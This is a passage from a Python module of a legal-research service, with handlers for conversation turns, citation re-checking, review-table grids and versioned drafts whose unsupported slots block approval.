    from gateway import envelope as ev

    raw = result.get("citations") or []
    if not raw:
        return [], []
    return ev.drop_unquoted(raw, verify=lambda c: verify_citation(c)[0])


def _draft_prose(template: str, source: dict, ctx: Context) -> tuple[list, str]:
    """(blocks, note) for a draft's connecting sentences. Never raises.

    The clearance lives HERE, with every other model call, and not in
    `checker/draft_prose.py`, which is pure. Which origin a draft's facts need is decided
    by what those facts ARE:

      research_memo   the citations' own corpus files -> PUBLIC, `clear_file`
      client_email    playbook findings, which carry values read out of the client's
                      contract -> MATTER, `clear_matter`, and D3 applies

    So while the deployment region is unconfirmed an email gets NO prose and a note saying
    exactly that, and the draft is still built from the findings. That is not a
    degradation to paper over: it is the residency rule working, and the note is how a
    user learns the difference between "we chose not to" and "we could not".
    """
    from checker import draft_prose, public_only, router
    try:
        sensitivity = draft_prose.sensitivity_of(template)
    except draft_prose.ProseError as e:
        return [], f"{draft_prose.NO_PROSE_PREFIX}{e}"

    facts = draft_prose.facts_for(template, source)
    if not facts:
        return [], (f"{draft_prose.NO_PROSE_PREFIX}the source run carries no findings to "
                    f"write about")
    try:
        if sensitivity == draft_prose.PUBLIC:
            # The citations' own files. A quote we are about to send is cleared against
            # the corpus file it was read from, not asserted public by this function.
            origins = tuple(public_only.clear_file(str(c.get("source")))
                            for c in (source.get("citations") or ())
                            if str(c.get("source") or ""))
            if not origins:
                return [], (f"{draft_prose.NO_PROSE_PREFIX}no citation in this run names "
                            f"the file it was read from, so nothing can be cleared")
        else:
            origins = (public_only.clear_matter(
                draft_prose.matter_text(facts), name=f"{template} findings",
                provider=router.AZURE),)
    except Exception as e:                                       # noqa: BLE001
        return [], (f"{draft_prose.NO_PROSE_PREFIX}these findings could not be cleared to "
                    f"leave the device ({type(e).__name__}: {str(e)[:140]})")

    served, refusal = _served_or_refusal(origins, name="draft_prose",
                                         purpose=router.NARRATION, ctx=ctx,
                                         consequence=router.LOW)
    if refusal:
        return [], (f"{draft_prose.NO_PROSE_PREFIX}no model could be served "
                    f"({refusal['code']}): {str(refusal.get('detail') or '')[:160]}")
    blocks, note = draft_prose.write(template, source, model=served.call)
    if blocks and _critic_enabled():
        blocks, note = _critic_prose(blocks, note, ctx)
    return blocks, note


def _critic_prose(blocks, note: str, ctx: Context):
    """Run the critic over model-written draft prose. Job 6b.

    The same rules as everywhere else -- flag or remove, at most one removal, never
    rewrite -- applied to the sentences a model wrote for a draft. A removed sentence is
    gone from the draft, and the note says so: the prose is optional embellishment, so
    losing one costs nothing a reader needed, while leaving in a sentence the critic
    objected to costs exactly what this layer exists to prevent.
    """
    from checker import critic as cr
    claims = [{"id": f"p{i}", "text": str(b.get("text") or "")}
              for i, b in enumerate(blocks, 1)]
    try:
        verdict = cr.review(claims, critique=_critic_for(ctx))
    except cr.CriticError:
        return blocks, note
    if not verdict.removed:
        return blocks, note
    gone = {i for i, _ in verdict.removed}
    kept = [b for i, b in enumerate(blocks, 1) if f"p{i}" not in gone]
    extra = (f"the critic removed {len(verdict.removed)} sentence(s) of connecting prose "
             f"({'; '.join(r for _, r in verdict.removed)[:160]})")
    return kept, (f"{note}; {extra}" if note else extra)


def _persist_result(ctx: Context, result: dict) -> None:
    """Record on the run what it produced, so a later turn can read it back.

    `_persist_run` writes the run, its steps and its propositions and **not its result**,
    so an inline-served run was stored as `status=ANSWERED, result=NULL` -- a row claiming
    an answer exists while keeping nothing of it. A worker-served run does store one
    (`gateway/worker.py`), so the same intent remembered different amounts depending on
    which path ran it. Job 3 needs it because a draft is built FROM a run that already
    happened, and the queued and inline paths must offer the draft the same thing.

    The status is read back and written unchanged: this records a result, it never decides
    one.
    """
    if ctx.store is None:
        return
    run_id = str(result.get("run_id") or "")
    if not run_id:
        return
    row = ctx.store.read_run(run_id)
    if row is None or row.get("result") is not None:
        return
    ctx.store.set_run(run_id, status=str(row.get("status") or "ANSWERED"),
                      refusal_code=row.get("refusal_code"),
                      result={k: v for k, v in result.items() if k != "run_id"})


def _conversation_send(args: dict, ctx: Context) -> dict:
    """One turn: classify, dispatch, store, and return the envelope or a run_id.

    A WRITE verb, so it is not on MCP: it creates a conversation, appends messages and may
    enqueue work. `mcp_tools()` enforces that rather than trusting this docstring.

    Long work goes on the job queue and the reply returns the run_id at once, with the
    assistant message's envelope NULL until a worker fills it -- which is why
    `messages.envelope` is nullable and why NULL is not `{}`.
    """
    import uuid
    from agents import intake
    from gateway import envelope as ev

    text = args.get("text") or ""
    if not isinstance(text, str):
        return _refuse("BAD_REQUEST", f"text must be a string, got {type(text).__name__}")
    raw_ids = args.get("file_ids")
    if raw_ids is None:
        raw_ids = []
    if not isinstance(raw_ids, list) or not all(isinstance(f, str) for f in raw_ids):
        return _refuse("BAD_REQUEST", "file_ids must be a list of strings")
    if not text.strip() and not raw_ids:
        return _refuse("BAD_REQUEST", "text or at least one file_id is required")
    as_of = (args.get("as_of") or "").strip() or _today(ctx)
    today = _today(ctx)
    if as_of < today:
        # The envelope's `as_of` is what the law was read AS AT, and nothing on this path
        # reads it as at a past date: the ask verb takes no as_of, and
        # `checker/sources/held.py` raises on one because point-in-time reconstruction of
        # substituted spans is UNVERIFIED against any external source (CLAUDE.md,
        # docs/RETRACTIONS.md). Stamping 2017-04-01 on today's consolidated text is the
        # retracted mistake with a field name on it, so it is refused rather than served.
        return _refuse("AS_OF_UNSUPPORTED",
                       f"as_of={as_of} is in the past, and this engine reads the law as it "
                       f"stands today ({today}). Point-in-time reconstruction is "
                       f"UNVERIFIED against any external source, so an answer stamped with "
                       f"a past date would be today's text wearing one. Ask without as_of, "
                       f"or ask what changed.")
    sources = args.get("sources")
    if sources is not None and not isinstance(sources, list):
        return _refuse("BAD_REQUEST", "sources must be a list of source ids")
    override = (args.get("task_override") or "").strip() or None
    if override is not None and override not in intake.TASKS:
        return _refuse("BAD_REQUEST",
                       f"{override!r} is not a task; one of {list(intake.TASKS)}")

    store = ctx.store
    if store is None:
        return _refuse("NO_STORE",
                       "a conversation needs a store: it is a durable thread, and "
                       "returning one that vanishes on restart would be a lie about what "
                       "was saved")

    # 1. the thread.
    cid = (args.get("conversation_id") or "").strip() or str(uuid.uuid4())
    if store.read_conversation(cid) is None:
        store.write_conversation({"conversation_id": cid,
                                  "title": (text.strip()[:60] or "Attachment")})

    # 2. the user's message, stored before anything is attempted. A turn that fails must
    #    still show what was asked.
    ordinal = store.next_ordinal(cid)
    store.append_message({"message_id": str(uuid.uuid4()), "conversation_id": cid,
                          "ordinal": ordinal, "role": "user", "text": text,
                          "file_ids": list(raw_ids)})

    # 3. the task.
    if override is not None:
        task, classification = override, {"task": override, "decided_by": "override",
                                          "reason": "the caller named the task"}
    else:
        named = [{"name": str((ctx.documents.get(f) or {}).get("name") or f), "type": ""}
                 for f in raw_ids]
        got = intake.classify(text, files=named, facts=args.get("facts"))
        task, classification = got.task, got.to_dict()

    files = _files_block(raw_ids, ctx)
    reply_id = str(uuid.uuid4())

    # 4a. nothing to run.
    if task == intake.NEEDS_CLARIFICATION:
        env = ev.build(status=ev.NEEDS_CLARIFICATION, task=task, as_of=as_of,
                       text_blocks=[{"text": classification.get("question")
                                     or "Could you say what you would like done?",
                                     "citation_ids": []}],
                       bodies=[], citations=[], files=files)
        store.append_message({"message_id": reply_id, "conversation_id": cid,
                              "ordinal": ordinal + 1, "role": "assistant", "text": "",
                              "file_ids": [], "task": task, "envelope": env})
        return {"conversation_id": cid, "message_id": reply_id,
                "classification": classification, "envelope": env}

    verb_name = TASK_VERB.get(task, "")
    if not verb_name:
        env = ev.build(status=ev.ABSTAINED, task=task, as_of=as_of,
                       text_blocks=[{"text": (
                           f"This is a {task} question and this engine cannot answer one "
                           f"yet: the intent is declared in agents/plans.py and no verb "
                           f"serves it. Nothing was read, so nothing follows about any "
                           f"obligation."), "citation_ids": []}],
                       bodies=[], citations=[], files=files)
        store.append_message({"message_id": reply_id, "conversation_id": cid,
                              "ordinal": ordinal + 1, "role": "assistant", "text": "",
                              "file_ids": [], "task": task, "envelope": env})
        return {"conversation_id": cid, "message_id": reply_id,
                "classification": classification, "envelope": env}

    # 4b. long work -> the queue, and the run_id comes back at once.
    intent = TASK_INTENT.get(task)
    if intent and ctx.queue is not None:
        sub = _runs_submit({"intent": intent, "args": _task_args(task, text, raw_ids, ctx,
                                                                 args)}, ctx)
        if sub.get("status") == "REFUSED":
            return sub
        run_id = sub.get("run_id")
        store.append_message({"message_id": reply_id, "conversation_id": cid,
                              "ordinal": ordinal + 1, "role": "assistant", "text": "",
                              "file_ids": [], "task": task, "run_id": run_id,
                              "envelope": None})
        # READING, and this is the only path that can honestly say it: a worker holds the
        # file and has not finished with it. Returned alongside the run_id so the panel has
        # something to show while `envelope` is null -- without it READING was a state in
        # the schema that nothing ever produced.
        reading = [dict(f, state=ev.READING, pages=None, reason=None)
                   if f["state"] == ev.READ else f for f in files]
        reading = [{k: v for k, v in f.items() if v is not None or k in
                    ("file_id", "name", "state")} for f in reading]
        return {"conversation_id": cid, "message_id": reply_id,
                "classification": classification, "run_id": run_id,
                "envelope": None, "files": reading, "task": task,
                "note": ("queued. The envelope is written when the worker finishes; poll "
                         "runs.get, or read the message again. `envelope: null` means the "
                         "reply has not arrived, which is not an empty answer.")}

    # 4c. short enough to answer now.
    verb = by_name()[verb_name]
    built = None
    prose_note = ""
    if task == "DRAFT":
        template, source, source_run = _draft_source(cid, ctx)
        if template:
            from checker import draft_templates
            prose = args.get("prose")
            if not isinstance(prose, list):
                # Nobody supplied sentences, so ask a model for them. Job 3c. Whatever
                # comes back goes through the SAME admit/drop rule as caller-supplied
                # prose -- there is no second path and no softer rule for our own model.
                prose, prose_note = _draft_prose(template, source, ctx)
            built = draft_templates.build(template, source, prose=prose)
    result = verb.run(_task_args(task, text, raw_ids, ctx, args, built=built), ctx)
    _persist_result(ctx, result)
    if _critic_enabled() and task != "RESEARCH_QUESTION" and "critic" not in result:
        # "All answer tasks" means the critic is CONSULTED for all of them. It can only
        # act where there are cited statutory sentences to act on, which today is the
        # research path; a contract review's findings are playbook comparisons, not claims
        # about law, and have no spans for it to check. Said out loud rather than left as
        # a silent gap, so nobody reads a clean reply as "the critic approved this".
        result = dict(result, critic_note=(
            f"CRITIC_ENABLED is on and the critic did not run for a {task} turn: it "
            f"reviews cited statutory sentences, and this task produces none."))
    if built is not None and result.get("status") != "REFUSED":
        result = dict(result, drafted_from=source_run, template=built.kind,
                      dropped_claims=[dict(d) for d in built.dropped],
                      prose_note=prose_note)
    env = _envelope_for(task, result, as_of=as_of, run_id=result.get("run_id"),
                        files=files, ctx=ctx, question=text)
    store.append_message({"message_id": reply_id, "conversation_id": cid,
                          "ordinal": ordinal + 1, "role": "assistant", "text": "",
                          "file_ids": [], "task": task,
                          "run_id": result.get("run_id"), "envelope": env})
    out = {"conversation_id": cid, "message_id": reply_id,
           "classification": classification, "run_id": result.get("run_id"),
           "envelope": env}
    if task == "DRAFT" and result.get("draft_id"):
        out["draft_id"] = result["draft_id"]
        out["version"] = result.get("version")
        if built is not None:
            # A drop is a fact about this reply, so it travels as a field and not only as
            # a sentence a client may not render.
            out["drafted_from"] = source_run
            out["template"] = built.kind
            out["dropped_claims"] = [dict(d) for d in built.dropped]
            out["prose_note"] = prose_note
    if task == "REVIEW_TABLE" and result.get("grid_id"):
        out["grid_id"] = result["grid_id"]
    return out


def _task_args(task: str, text: str, file_ids, ctx: Context, args: dict,
               *, built=None) -> dict:
    """The arguments the target verb takes. One place, so a task cannot be dispatched with
    a field the verb does not declare."""
    doc = ""
    for fid in file_ids or ():
        d = ctx.documents.get(fid) or {}
        if d.get("text"):
            doc = str(d["text"])
            break
    if task == "RESEARCH_QUESTION":
        return {"question": text}
    if task == "EVENT_ASSESS":
        return {"event": (args.get("event") or "commercial_contract"),
                "facts": args.get("facts") or {}}
    if task == "REVIEW_TABLE":
        # One column per question asked, and with nothing to go on there is exactly one:
        # the user's own words. Inventing a six-column diligence grid from a sentence
        # would be guessing at what they want and spending a run per guess.
        return {"name": (text.strip()[:60] or "Review table"),
                "document_ids": list(file_ids or ()),
                "columns": [{"name": "answer", "kind": "text",
                             "question": text.strip() or "What does this document say?"}]}
    if task == "DRAFT":
        if built is not None:
            # Built from a run that already happened, by `checker/draft_templates.py`:
            # every statement of law in it is a quote from that run's citations, and the
            # model's connecting prose is MODEL_SUGGESTION, which blocks approval.
            return {"title": built.title, "body": built.body,
                    "slots": [s.to_dict() for s in built.slots],
                    "citations": list(built.citations),
                    "kind": args.get("kind") or built.kind}
        # No prior run to draft from. The conversation's words become the TITLE, and the
        # body starts empty with an UNKNOWN slot: a draft this engine invented prose for
        # would be a MODEL_SUGGESTION document, and `provenance_slots` exists to stop that
        # reaching a filing. The user fills the slots through draft.revise.
        return {"title": (text.strip()[:80] or "Draft"),
                "body": "",
                "slots": [{"name": "body", "value": "", "type": "UNKNOWN",
                           "note": ("nothing has been drafted yet: this engine does not "
                                    "write legal prose unprompted, and an UNKNOWN slot "
                                    "blocks approval until a person fills it")}],
                "kind": args.get("kind") or "agm_notice"}
    if task == "REVIEW_CONTRACT":
        return {"text": doc or text, "name": "conversation upload",
                "test_data": args.get("test_data") or "unspecified"}
    return {"text": doc or text, "name": "conversation upload"}


def _conversation_list(args: dict, ctx: Context) -> dict:
    """The threads, newest first. Tenant-scoped by the store, not by this handler."""
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured, so there are no conversations")
    limit = args.get("limit")
    limit = int(limit) if isinstance(limit, (int, float, str)) and str(limit).isdigit() else 50
    return {"conversations": ctx.store.list_conversations(limit=min(limit, 200))}


def _conversation_get(args: dict, ctx: Context) -> dict:
    """One thread and every message in it, in order, each with its stored envelope."""
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    cid = (args.get("conversation_id") or "").strip()
    if not cid:
        return _refuse("BAD_REQUEST", "conversation_id is required")
    conv = ctx.store.read_conversation(cid)
    if conv is None:
        return _refuse("NOT_FOUND", f"no conversation {cid!r} for this tenant")
    return {"conversation": conv, "messages": ctx.store.read_messages(cid)}


def _citation_get(args: dict, ctx: Context) -> dict:
    """One citation in full, for the source panel, RE-READ from the corpus.

    The panel is where a lawyer goes to check, so it is the last place that should show a
    quote nobody re-read. `verify_citation` goes back to
    `section_index.section_by_number` and `html_to_text` -- the same two functions the
    evidence path used -- and reports which of three things failed if any did.
    """
    cid = (args.get("citation_id") or "").strip()
    conv_id = (args.get("conversation_id") or "").strip()
    if not cid:
        return _refuse("BAD_REQUEST", "citation_id is required")
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    if not conv_id:
        return _refuse("BAD_REQUEST",
                       "conversation_id is required: a citation is read back from the "
                       "message that made it, so the tenant's own policy governs the read")
    for msg in ctx.store.read_messages(conv_id):
        for c in (msg.get("envelope") or {}).get("citations", ()):
            if c.get("id") != cid:
                continue
            ok, why = verify_citation(c)
            return {"citation": c, "message_id": msg["message_id"],
                    "reverified": ok, "reverified_note": why,
                    "note": ("The quote was re-read from the corpus just now, not trusted "
                             "from the stored answer. reverified=false means nothing may "
                             "rest on it, whatever the stored envelope says.")}
    return _refuse("NOT_FOUND", f"no citation {cid!r} in conversation {conv_id!r}")

# ── H4: review tables ────────────────────────────────────────────────────────
#
# The verbs are `review_table.*` because that is what a user calls it; the code is
# `review_grid` because `checker/review_table.py` is an older, unrelated module. One
# feature, three names, written down in docs/START_HERE.md §5.

# Every cell is a RUN (gateway/jobs.py refuses two jobs for one run), so a grid is a
# multiplier on the queue and on the bill: 40 documents x 6 columns is 240 runs. The cap is
# a declared number rather than a judgement at call time, and it is checked BEFORE anything
# is enqueued -- a half-enqueued grid is the worst outcome, because the user is billed for
# the part that ran and has no table.
MAX_GRID_CELLS = 500


def _review_table_create(args: dict, ctx: Context) -> dict:
    """Define a grid and enqueue one job per cell. Refuses above the cell cap.

    A WRITE verb: it creates a grid and queues work, so `mcp_tools()` keeps it off MCP.
    """
    import uuid
    from agents import review_grid as rgr
    from checker import review_grid as rg

    name = (args.get("name") or "").strip()
    if not name:
        return _refuse("BAD_REQUEST", "a review table needs a name")
    raw_docs = args.get("document_ids") or []
    raw_cols = args.get("columns") or []
    if not isinstance(raw_docs, list) or not all(isinstance(d, str) for d in raw_docs):
        return _refuse("BAD_REQUEST", "document_ids must be a list of strings")
    if not isinstance(raw_cols, list):
        return _refuse("BAD_REQUEST", "columns must be a list of objects")
    if not raw_docs:
        return _refuse("BAD_REQUEST", "a review table needs at least one document")
    if not raw_cols:
        return _refuse("BAD_REQUEST",
                       "a review table with no columns asks nothing of its documents")

    try:
        columns = tuple(rg.Column(str(c.get("name") or ""), str(c.get("kind") or ""),
                                  str(c.get("question") or ""))
                        for c in raw_cols if isinstance(c, dict))
    except rg.TableError as e:
        return _refuse("BAD_REQUEST", str(e))
    if len(columns) != len(raw_cols):
        return _refuse("BAD_REQUEST", "every column must be an object")

    # ── the cost guard, before anything is enqueued ──────────────────────────
    cells = len(raw_docs) * len(columns)
    if cells > MAX_GRID_CELLS:
        return _refuse("GRID_TOO_LARGE",
                       f"{len(raw_docs)} document(s) x {len(columns)} column(s) = "
                       f"{cells} cells, and the cap is {MAX_GRID_CELLS}. Every cell is a "
                       f"separate run and a separate model call, so this is a bill and a "
                       f"queue depth, not just a big table. Narrow the documents or the "
                       f"columns, or raise the cap deliberately.")
    ledger = _ledger()
    if ledger is not None:
        verdict = ledger.can_make_call()
        if not verdict.allowed:
            # Checked BEFORE the first enqueue. A grid that half-runs bills the user for
            # the part that ran and leaves them without a table.
            return _refuse("NO_BUDGET",
                           f"{verdict.reason} No cell was enqueued, so nothing was spent "
                           f"on this table.")

    store = ctx.store
    if store is None:
        return _refuse("NO_STORE",
                       "a review table is durable work: it needs a store, and returning "
                       "one that vanishes on restart would be a lie about what was saved")
    grid_id = (args.get("grid_id") or "").strip() or str(uuid.uuid4())
    table = rg.Table(grid_id, name, columns, tuple(raw_docs))
    store.write_grid({"grid_id": grid_id, "name": name,
                      "columns": [{"name": c.name, "kind": c.kind,
                                   "question": c.question} for c in columns],
                      "document_ids": list(raw_docs)})

    sched = rgr.Scheduled(grid_id)
    if ctx.queue is not None:
        sched = rgr.schedule(table, queue=ctx.queue)
    out = {"grid_id": grid_id, "name": name, "cells": cells,
           "documents": len(raw_docs), "columns": len(columns),
           "scheduled": sched.to_dict(),
           "cap": MAX_GRID_CELLS,
           # UNPRICED stays UNPRICED: a grid's cost is the sum of calls that have not
           # happened, and a number here would be an estimate presented as a price. The
           # per-call ledger prices each cell when it runs.
           "estimated_cost_inr": None,
           "cost_note": ("UNPRICED: every cell is a separate model call and none has run "
                         "yet. The ledger prices each one as it happens; a figure here "
                         "would be a guess wearing a currency symbol."),
           "note": ("One run per cell. Poll review_table.status; nothing is answered until "
                    "a worker has run it, and a PENDING cell is not a NOT_FOUND one.")}
    return out


def _review_table_status(args: dict, ctx: Context) -> dict:
    """The grid, its per-state counts and whether it is complete. Read-only."""
    from agents import review_grid as rgr

    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    grid_id = (args.get("grid_id") or "").strip()
    if not grid_id:
        return _refuse("BAD_REQUEST", "grid_id is required")
    table, cancelled = _load_grid(ctx, grid_id)
    if table is None:
        return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
    out = rgr.status(table, cancelled=cancelled)
    # The running total, from the cells this verb already read -- not from 240 extra reads
    # of each cell's run steps, which is why 013 put the debit on the cell.
    out["spend"] = _grid_spend(ctx.store.read_grid_cells(grid_id))
    out["cells_detail"] = [table.cell(d, c.name).to_dict()
                           if hasattr(table.cell(d, c.name), "to_dict")
                           else {"document_id": d, "column": c.name,
                                 "state": table.cell(d, c.name).state,
                                 "value": table.cell(d, c.name).value,
                                 "quote": table.cell(d, c.name).quote,
                                 "reason": table.cell(d, c.name).reason}
                           for d in table.document_ids for c in table.columns]
    return out


def _review_table_export(args: dict, ctx: Context) -> dict:
    """The grid as CSV. Every cell non-empty, and none of them able to run as a formula."""
    from checker import review_grid as rg

    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    grid_id = (args.get("grid_id") or "").strip()
    if not grid_id:
        return _refuse("BAD_REQUEST", "grid_id is required")
    table, cancelled = _load_grid(ctx, grid_id)
    if table is None:
        return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
    names = {d: str((ctx.documents.get(d) or {}).get("name") or d)
             for d in table.document_ids}
    t = table.tally()
    return {"grid_id": grid_id, "filename": f"{table.name[:40] or 'review-table'}.csv",
            "content_type": "text/csv",
            "csv": rg.to_csv(table, names=names),
            "complete": table.complete, "cancelled": cancelled,
            "findings": t["findings"], "cells": t["cells"],
            "note": ("Every cell carries words, never a blank: NOT FOUND, NEEDS LAWYER, "
                     "PENDING and COULD NOT RUN each read differently, because a blank "
                     "makes 'the clause is absent' and 'we did not read it' identical. "
                     "Values beginning = + - @ are prefixed with a single quote so the "
                     "file cannot run as a formula in a spreadsheet.")}


def _load_grid(ctx: Context, grid_id: str):
    """(Table, cancelled) from the store, or (None, False)."""
    from checker import review_grid as rg

    row = ctx.store.read_grid(grid_id)
    if row is None:
        return None, False
    columns = tuple(rg.Column(c["name"], c["kind"], c["question"])
                    for c in row.get("columns") or ())
    cells = []
    for c in ctx.store.read_grid_cells(grid_id):
        cells.append(rg.Cell(document_id=c["document_id"], column=c["column_name"],
                             state=c["state"], value=c.get("value") or "",
                             quote=c.get("quote") or "", reason=c.get("reason") or ""))
    table = rg.Table(grid_id, row.get("name") or "", columns,
                     tuple(row.get("document_ids") or ()), tuple(cells))
    return table, bool(row.get("cancelled_at"))


# ── H3: drafts ───────────────────────────────────────────────────────────────
#
# `checker/draft_versions.py` holds the history and the diff; `checker/provenance_slots.py`
# types every value and is what blocks approval. These verbs are the surface.

def _slots_from(raw) -> tuple:
    """Wire slots -> Slot objects. A malformed one is refused, never dropped."""
    from checker.provenance_slots import Slot
    out = []
    for i, item in enumerate(raw or ()):
        if not isinstance(item, dict):
            raise ValueError(f"slots[{i}] must be an object")
        out.append(Slot(name=str(item.get("name") or ""),
                        value=str(item.get("value") or ""),
                        slot_type=str(item.get("type") or item.get("slot_type") or ""),
                        source=str(item.get("source") or ""),
                        working=str(item.get("working") or ""),
                        note=str(item.get("note") or "")))
    return tuple(out)


def _draft_history(ctx: Context, draft_id: str):
    """(History, the draft row) or (None, None). Rebuilt from the store every time."""
    from checker.draft_versions import History, Version
    from checker.provenance_slots import Slot

    row = ctx.store.read_draft(draft_id)
    if row is None:
        return None, None
    versions = []
    for v in ctx.store.read_draft_versions(draft_id):
        slots = tuple(Slot(name=s.get("name") or "", value=s.get("value") or "",
                           slot_type=s.get("type") or s.get("slot_type") or "UNKNOWN",
                           source=s.get("source") or "", working=s.get("working") or "",
                           note=s.get("note") or "")
                      for s in v.get("slots") or ())
        versions.append(Version(
            draft_id=draft_id, version=v["version"], title=v["title"],
            body=v.get("body") or "", slots=slots,
            citations=tuple(v.get("citations") or ()),
            created_at=v.get("created_at") or "2026-01-01T00:00:00+00:00",
            approved_by=v.get("approved_by") or "",
            approved_at=v.get("approved_at") or ""))
    return History(draft_id, tuple(versions)), row


def _save_version(ctx: Context, draft_id: str, *, title: str, body: str, slots: tuple,
                  citations: tuple, approved_by: str = "", approved_at: str = "") -> int:
    """Persist one version, with blocking_count from the same call that gates approval."""
    from checker.provenance_slots import blocking_slots
    return ctx.store.append_draft_version({
        "draft_id": draft_id, "title": title, "body": body,
        "slots": [s.to_dict() for s in slots], "citations": list(citations),
        # From blocking_slots(), the function Version.approve() gates on -- so the
        # denormalised count in 012 cannot drift from the rule it enforces.
        "blocking_count": len(blocking_slots(slots)),
        "approved_by": approved_by or None, "approved_at": approved_at or None})


def _draft_create(args: dict, ctx: Context) -> dict:
    """Start a draft at version 1. A WRITE verb, so it is off MCP."""
    import uuid
    if ctx.store is None:
        return _refuse("NO_STORE", "a draft is a durable document; it needs a store")
    title = (args.get("title") or "").strip()
    if not title:
        return _refuse("BAD_REQUEST", "a draft needs a title")
    try:
        slots = _slots_from(args.get("slots"))
    except Exception as e:                                      # noqa: BLE001
        return _refuse("BAD_REQUEST", f"slots: {e}")
    body = args.get("body") or ""
    if not isinstance(body, str):
        return _refuse("BAD_REQUEST", "body must be a string")
    draft_id = (args.get("draft_id") or "").strip() or str(uuid.uuid4())
    ctx.store.write_draft({"draft_id": draft_id,
                           "kind": (args.get("kind") or "agm_notice"), "title": title})
    try:
        n = _save_version(ctx, draft_id, title=title, body=body, slots=slots,
                          citations=tuple(args.get("citations") or ()))
    except Exception as e:                                      # noqa: BLE001
        return _refuse("BAD_REQUEST", str(e))
    return _draft_status(ctx, draft_id, version=n,
                         note="Version 1 saved. Every save is a new version; nothing is "
                              "edited in place.")


def _draft_revise(args: dict, ctx: Context) -> dict:
    """Save a NEW version. Never edits one. Optionally records an approval."""
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    draft_id = (args.get("draft_id") or "").strip()
    if not draft_id:
        return _refuse("BAD_REQUEST", "draft_id is required")
    history, row = _draft_history(ctx, draft_id)
    if history is None:
        return _refuse("NOT_FOUND", f"no draft {draft_id!r} for this tenant")
    latest = history.latest
    try:
        slots = (_slots_from(args["slots"]) if "slots" in args
                 else tuple(latest.slots if latest else ()))
    except Exception as e:                                      # noqa: BLE001
        return _refuse("BAD_REQUEST", f"slots: {e}")
    title = (args.get("title") or (latest.title if latest else row["title"]))
    body = args.get("body") if args.get("body") is not None else (
        latest.body if latest else "")
    citations = tuple(args.get("citations") or (latest.citations if latest else ()))

    reviewer = (args.get("approved_by") or "").strip()
    approved_at = ""
    if reviewer:
        from checker.draft_versions import Version, VersionError
        probe = Version(draft_id=draft_id, version=1, title=title, body=body,
                        slots=slots, citations=citations,
                        created_at=_now_iso(ctx))
        try:
            probe.approve(reviewer, _now_iso(ctx))
        except VersionError as e:
            # The gate, before anything is written. An unsupported draft cannot be
            # approved, and saying so is more useful than storing an unapproved version.
            return _refuse("APPROVAL_BLOCKED", str(e))
        approved_at = _now_iso(ctx)
    try:
        n = _save_version(ctx, draft_id, title=title, body=body, slots=slots,
                          citations=citations, approved_by=reviewer,
                          approved_at=approved_at)
    except Exception as e:                                      # noqa: BLE001
        return _refuse("CONFLICT", str(e))
    return _draft_status(ctx, draft_id, version=n,
                         note=("Saved as a new version." + (" Approved." if reviewer
                                                            else "")))


def _now_iso(ctx: Context) -> str:
    if ctx.clock is not None:
        return str(ctx.clock())
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def _draft_status(ctx: Context, draft_id: str, *, version=None, note: str = "") -> dict:
    history, row = _draft_history(ctx, draft_id)
    if history is None:
        return _refuse("NOT_FOUND", f"no draft {draft_id!r} for this tenant")
    latest = history.latest
    ready = bool(latest and latest.ready)
    return {"draft_id": draft_id, "title": row["title"], "kind": row.get("kind"),
            "versions": len(history.versions), "version": version or (
                latest.version if latest else 0),
            "ready_for_approval": ready,
            # A draft with an unsupported slot needs a PERSON, which is what NEEDS_LAWYER
            # means. `_envelope_for` reads this, so a DRAFT turn does not come back
            # ANSWERED while a slot is still blank -- "here is your document" about a
            # document nobody has written is the worst thing this envelope could say.
            "requires_review": not ready,
            "blocking": [s.name for s in (latest.blockers() if latest else ())],
            "approved": bool(latest and latest.approved),
            "approved_by": (latest.approved_by or None) if latest else None,
            "note": note or ("A MODEL_SUGGESTION or UNKNOWN slot blocks approval: a "
                             "fluent sentence is not evidence of anything, and a blank "
                             "in a legal document is not a small problem.")}


def _draft_versions(args: dict, ctx: Context) -> dict:
    """Every version of a draft, in order. Read-only."""
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    draft_id = (args.get("draft_id") or "").strip()
    if not draft_id:
        return _refuse("BAD_REQUEST", "draft_id is required")
    history, row = _draft_history(ctx, draft_id)
    if history is None:
        return _refuse("NOT_FOUND", f"no draft {draft_id!r} for this tenant")
    return {"draft_id": draft_id, "title": row["title"],
            "versions": [v.to_dict() for v in history.versions],
            "note": ("Append-only: a version is never edited, so an earlier one is "
                     "exactly what was written then -- including what was NOT supported "
                     "and why.")}


def _draft_diff(args: dict, ctx: Context) -> dict:
    """The exact diff between two versions: the text, and the provenance."""
    from checker.draft_versions import VersionError, diff as _diff

    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    draft_id = (args.get("draft_id") or "").strip()
    if not draft_id:
        return _refuse("BAD_REQUEST", "draft_id is required")
    history, _row = _draft_history(ctx, draft_id)
    if history is None:
        return _refuse("NOT_FOUND", f"no draft {draft_id!r} for this tenant")
    try:
        a = history.at(int(args.get("from_version") or 1))
        b = history.at(int(args.get("to_version") or (history.latest.version
                                                      if history.latest else 1)))
    except (VersionError, ValueError, TypeError) as e:
        return _refuse("BAD_REQUEST", str(e))
    return _diff(a, b)


def _draft_export(args: dict, ctx: Context) -> dict:
    """One version as text or .docx. The .docx is written with the standard library."""
    import base64
    from checker.draft_versions import VersionError, to_docx, to_text

    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    draft_id = (args.get("draft_id") or "").strip()
    if not draft_id:
        return _refuse("BAD_REQUEST", "draft_id is required")
    history, row = _draft_history(ctx, draft_id)
    if history is None:
        return _refuse("NOT_FOUND", f"no draft {draft_id!r} for this tenant")
    fmt = (args.get("format") or "docx").strip().lower()
    if fmt not in ("docx", "text"):
        return _refuse("BAD_REQUEST", f"format must be docx or text, got {fmt!r}")
    try:
        v = history.at(int(args.get("version") or (history.latest.version
                                                   if history.latest else 1)))
    except (VersionError, ValueError, TypeError) as e:
        return _refuse("BAD_REQUEST", str(e))
    safe = re.sub(r"[^A-Za-z0-9._-]+", "-", row["title"])[:40].strip("-") or "draft"
